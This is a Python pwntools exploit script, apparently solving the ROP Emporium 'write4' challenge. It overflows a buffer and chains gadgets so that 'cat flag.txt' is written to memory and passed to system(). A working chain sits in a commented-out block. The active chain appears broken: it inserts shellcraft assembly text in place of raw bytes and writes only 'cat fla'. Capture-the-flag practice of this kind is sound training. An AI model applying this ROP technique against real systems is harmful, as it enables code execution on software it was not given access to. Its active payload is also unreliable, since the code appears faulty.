from pwn import *

elf = context.binary = ELF("./write4")
#rop = ROP(elf)
context.log_level = "debug" 
rop = ROP(elf)

system_address = elf.symbols['system']
write_address       = 0x601050
pop_pop_ret_address = (rop.find_gadget(['pop r14','pop r15', 'ret']))[0]
print pop_pop_ret_address
pop_rdi_ret_address = (rop.find_gadget(['pop rdi', 'ret']))[0]
print pop_rdi_ret_address
#mov_address         = (rop.find_gadget(['mov qword ptr [r14], r15 ','ret']))[0]
mov_address         = 0x400820 #mov qword ptr [r14], r15 ; ret


p = process("./write4")
#payload = flat(["A"*40, p64(pop_pop_ret_address), p64(write_address),"cat fla\x00",p64(mov_address),p64(pop_pop_ret_address),p64(write_address + 7),"g.txt\x00\x00\x00",p64(mov_address) ,p64(pop_rdi_ret_address),p64(write_address),p64(system_address)])
'''
ropchain =  "A"*40
ropchain += p64(pop_pop_ret_address)
ropchain += p64(write_address)
ropchain += "cat fla\x00"
ropchain += p64(mov_address)
ropchain += p64(pop_pop_ret_address)
ropchain += p64(write_address + 7)
ropchain += "g.txt\x00\x00\x00"
ropchain += p64(mov_address)
ropchain += p64(pop_rdi_ret_address)
ropchain += p64 (write_address)
ropchain += p64(system_address)
'''
ropchain =  "A"*40
ropchain += p64(pop_pop_ret_address)
ropchain += p64(write_address)
ropchain += shellcraft.amd64.pushstr('cat fla').rstrip()
ropchain += p64(mov_address)
ropchain += p64(pop_rdi_ret_address)
ropchain += p64 (write_address)
ropchain += p64(system_address)

p.sendline(ropchain)
p.interactive()

#f = elf.plt

#print "%#x -> system" % e.symbols['system']
#print("%#x" %e.symbols['system'])

